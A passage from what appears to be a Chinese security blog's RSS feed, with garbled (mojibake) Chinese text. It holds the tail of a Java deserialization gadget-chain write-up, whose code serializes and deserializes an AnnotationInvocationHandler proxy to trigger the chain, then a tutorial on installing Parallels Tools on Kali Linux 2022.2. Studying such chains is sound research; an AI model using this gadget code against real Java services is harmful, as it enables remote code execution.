&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxyMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Proxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newProxyInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInterfaces&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Lazyhandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOAPMessageHandlers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxyMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toByteArray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;0x04-æ€»ç»“&#34;&gt;0x04 æ€»ç»“&lt;/h2&gt;
&lt;p&gt;å…¶å®è¿˜æœ‰JDKç‰ˆæœ¬çš„é—®é¢˜ï¼Œå› ä¸ºé«˜ç‰ˆæœ¬çš„ä¿®å¤äº†AnnotationInvocationHandlerçš„readObjectï¼Œä½†æ˜¯åœ¨CC6çš„è¿˜æ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œåœ¨åç»­ä¹Ÿä¼šå‡ºç›¸å…³çš„æ–‡ç« ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œé¢æœ‰å¾ˆå¤šåŸºç¡€çš„çŸ¥è¯†éœ€è¦æŒæ¡ï¼Œè¦ä¸ç„¶ä¼šçœ‹å¾—å¾ˆç´¯ï¼Œæ‰€ä»¥å¤§å®¶è¿˜æ˜¯è¦ç»§ç»­åŠ æ²¹ï¼&lt;/p&gt;
&lt;p&gt;ç¬”è€…ä¹Ÿæ˜¯ç…§è‘«èŠ¦ç”»ç“¢ï¼Œæœ‰å†™å¾—ä¸å¥½çš„çš„è¯·è§è°…ï¼Œæ„Ÿè°¢ï¼&lt;/p&gt;
&lt;h2 id=&#34;0x05-å‚è€ƒ&#34;&gt;0x05 å‚è€ƒ&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/phith0n/JavaThings&#34;&gt;https://github.com/phith0n/JavaThings&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Kali Linux 2022.2å®‰è£…Parallels Tools</title>
      <link>https://xxe.icu/install-parallels-tools-on-kali-linux-2022.2.html</link>
      <pubDate>Mon, 25 Jul 2022 01:00:00 +0200</pubDate>
      
      <guid>https://xxe.icu/install-parallels-tools-on-kali-linux-2022.2.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h1&gt;
&lt;p&gt;è¿™ä¸ªé—®é¢˜è¿˜æ˜¯å¼„åˆ°äº†å‡Œæ™¨ä¸‰ç‚¹ï¼Œæœ€å¯æ¶çš„æ˜¯è¿˜å¼„ä¸å¥½ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;æ—©ä¸Šèµ·äº†ä¸ªå¤§æ—©ç»§ç»­å¼„ï¼Œåœ¨é€›pdçš„è®ºå›å‘ç°é‡Œé¢è¯´äº†pdç°åœ¨è¿˜ä¸æ”¯æŒæœ€æ–°çš„5.18å†…æ ¸ï¼Œæ‰€ä»¥è¿˜æ˜¯å»ºè®®å®‰è£…5.16å’Œ5.17ï¼Œ5.17æˆ‘è¿˜æ‰¾ä¸åˆ°ï¼Œæ‰€ä»¥å°±ç”¨5.16æˆåŠŸå®‰è£…äº†ã€‚&lt;/p&gt;
&lt;p&gt;æœ‰å…´è¶£çš„åŒå­¦å¯ä»¥å»å°è¯•å®‰è£…&lt;a href=&#34;https://forum.parallels.com/members/galaxymaster.6698753/&#34;&gt;GalaxyMaster)&lt;/a&gt;çš„è¡¥ä¸åŒ…ï¼Œæˆ‘æ˜¯æ²¡èƒ½æˆåŠŸï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://forum.parallels.com/threads/patch-support-for-kernel-5-18-parallel-tools-17-1-4-51567.357611/&#34;&gt;https://forum.parallels.com/threads/patch-support-for-kernel-5-18-parallel-tools-17-1-4-51567.357611/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x01-è§£å†³é—®é¢˜&#34;&gt;0x01 è§£å†³é—®é¢˜&lt;/h1&gt;
&lt;h2 id=&#34;1ç¯å¢ƒ&#34;&gt;1ã€ç¯å¢ƒ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;macOS Monterey 12.3&lt;/li&gt;
&lt;li&gt;Parallels Desktop 17.1.2&lt;/li&gt;
&lt;li&gt;Kali Linux 2022.2 (linux-headers-5.16-kali5)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2è§£å†³è¿‡ç¨‹&#34;&gt;2ã€è§£å†³è¿‡ç¨‹&lt;/h2&gt;
&lt;p&gt;æ›´æ–°æºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get update
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŒ‚è½½parallels toolså¹¶ç§»åŠ¨åˆ°æ¡Œé¢ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp -R /media/cdrom0/ ~/Desktop/pdtools/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªæ—¶å€™å°±å¼€å§‹å‡ºé”™äº†ï¼Œå› ä¸ºä¹‹å‰æŠ¥é”™çš„log:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;In file included from /usr/src/linux-headers-5.16.0-kali7-common/include/linux/io.h:13,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                 from /usr/src/linux-headers-5.16.0-kali7-common/include/linux/pci.h:39,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                 from /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/prltg_call.c:7:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/src/linux-headers-5.16.0-kali7-common/arch/x86/include/asm/io.h:281:41: note: expected &lt;span class=&#34;s1&#34;&gt;&amp;#39;int&amp;#39;&lt;/span&gt; but argument is of &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;void *&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;m&#34;&gt;281&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; static inline unsigned &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; in##bwl&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;int port&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                           &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                                     ~~~~^~~~
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/src/linux-headers-5.16.0-kali7-common/arch/x86/include/asm/io.h:336:1: note: in expansion of macro &lt;span class=&#34;s1&#34;&gt;&amp;#39;BUILDIO&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;m&#34;&gt;336&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; BUILDIO&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;l, , int&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ^~~~~~~
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;In file included from /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/prltg_call.c:11:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/bin/sh: 1: /usr/src/linux-headers-5.16.0-kali7-common/scripts/pahole-flags.sh: not found
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CC &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;M&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  /usr/lib/parallels-tools/kmods/prl_eth/pvmnet/pvmnet.o
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  LD &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;M&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  /usr/lib/parallels-tools/kmods/prl_eth/pvmnet/prl_eth.o
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/bin/sh: 1: /usr/src/linux-headers-5.16.0-kali7-common/scripts/pahole-flags.sh: not found
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/bin/sh: 1: /usr/src/linux-headers-5.16.0-kali7-common/scripts/pahole-flags.sh: not found
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  MODPOST /usr/lib/parallels-tools/kmods/prl_eth/pvmnet/Module.symvers
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œä¸å±•ç¤ºå®‰è£…è¡¥ä¸çš„è¿‡ç¨‹äº†ï¼Œå› ä¸ºæ²¡æˆåŠŸï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹å¯ä»¥æé†’ä¸€ä¸‹ï¼Œå…³äºæ‰§è¡Œè¡¥ä¸å‘½ä»¤è®ºå›é‡Œé¢è¯´çš„å‘½ä»¤æ˜¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;patch -p1 file.patch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;-p1 æ˜¯è¡¨ç¤ºå¿½ç•¥ç¬¬ä¸€å±‚ç›®å½•&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä½†æ˜¯æ‰§è¡Œä¼šåœç•™åœ¨é‚£é‡Œä¸åŠ¨ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤è¿›è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;patch -p1 &amp;lt; file.patch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‹é¢æ˜¯5.16å†…æ ¸çš„å®‰è£…æ–¹æ³•&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç›´æ¥æ‰§è¡Œ&lt;code&gt;./install&lt;/code&gt; ä¸€èˆ¬ä¼šå‡ºç°ç³»ç»Ÿç¼ºå°‘äº†&lt;code&gt;dkms&lt;/code&gt;å’Œ&lt;code&gt;linux-header&lt;/code&gt;ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install dkms
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½†å®‰è£…å¤´æ–‡ä»¶çš„æ—¶å€™å°±å‡ºé—®é¢˜äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å»æ‰¾è½¯ä»¶åŒ…è¿›è¡Œå®‰è£…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://old.kali.org/kali/pool/main/l/linux/&#34;&gt;http://old.kali.org/kali/pool/main/l/linux/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹è½½ä»¥ä¸‹çš„æ–‡ä»¶&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://old.kali.org/kali/pool/main/l/linux/linux-headers-5.16.0-kali7-amd64_5.16.18-1kali1_amd64.deb&#34;&gt;linux-headers-5.16.0-kali7-amd64_5.16.18-1kali1_amd64.deb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://old.kali.org/kali/pool/main/l/linux/linux-headers-5.16.0-kali7-common_5.16.18-1kali1_all.deb&#34;&gt;linux-headers-5.16.0-kali7-common_5.16.18-1kali1_all.deb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¦‚æœæç¤ºç¼ºå°‘kbuildå¯ä»¥ä¸‹è½½ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://old.kali.org/kali/pool/main/l/linux/linux-kbuild-5.16_5.16.18-1kali1_amd64.deb&#34;&gt;linux-kbuild-5.16_5.16.18-1kali1_amd64.deb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://old.kali.org/kali/pool/main/l/linux/linux-kbuild-5.16-dbgsym_5.16.18-1kali1_amd64.deb&#34;&gt;linux-kbuild-5.16-dbgsym_5.16.18-1kali1_amd64.deb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä½¿ç”¨dpkg -iå®‰è£…å°±å®Œäº‹äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg -i linux-kbuild-5.16_5.16.18-1kali1_amd64.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg -i linux-kbuild-5.16-dbgsym_5.16.18-1kali1_amd64.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg -i linux-headers-5.16.0-kali7-common_5.16.18-1kali1_all.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg -i linux-headers-5.16.0-kali7-amd64_5.16.18-1kali1_amd64.deb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åé‡æ–°æ‰§è¡Œä»¥å®‰è£…æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡å¯å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï½&lt;/p&gt;
&lt;h1 id=&#34;0x02-æ€»ç»“&#34;&gt;0x02 æ€»ç»“&lt;/h1&gt;
&lt;p&gt;å¯ä»¥å‚è€ƒä¸€ä¸‹pdè®ºå›ï¼Œä¸Šé¢å¾ˆå¤šå¤§ç¥å¯ä»¥è§£å†³é—®é¢˜ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://forum.parallels.com/forums/linux-guest-os-discussion.61/&#34;&gt;https://forum.parallels.com/forums/linux-guest-os-discussion.61/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é™„ä¸Šè®ºå›é‡Œé¢çš„ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Got it working with these steps.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install dkms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install libelf-dev
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Downloaded the 3 file from https://http.kali.org/kali/pool/main/l/linux/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;linux-headers-5.16.0-kali7-arm64_5.16.18-1kali1_arm64.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;linux-kbuild-5.16_5.16.18-1kali1_arm64.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;linux-headers-5.16.0-kali7-common_5.16.18-1kali1_all.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo dpkg -i linux-headers-5.16.0-kali7-common_5.16.18-1kali1_all.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo dpkg -i linux-kbuild-5.16_5.16.18-1kali1_arm64.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo dpkg -i linux-headers-5.16.0-kali7-arm64_5.16.18-1kali1_arm64.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Install tools
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo mount -oro,exec,remount /media/cdrom0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo /media/cdrom0/install
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hope that helps.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å¦‚æœå·²ç»æ›´æ–°äº†5.18çš„ç‰ˆæœ¬å¯ä»¥é‡å¯åˆ°å¯åŠ¨è§£å†³ï¼Œé€‰æ‹©é«˜çº§-&amp;gt;é€‰æ‹©5.16çš„ç‰ˆæœ¬è¿›è¡Œå¯åŠ¨ç„¶åæŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤è¿›è¡Œã€‚&lt;/p&gt;
&lt;/blockquote&gt;
</description>
      
    </item>
    
    <item>
      <title>Javaä»£ç å®¡è®¡-URLDNSé“¾åˆ†æ</title>
      <link>https://xxe.icu/urldns_chain_analysis.html</link>
      <pubDate>Wed, 01 Jun 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/urldns_chain_analysis.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h1&gt;
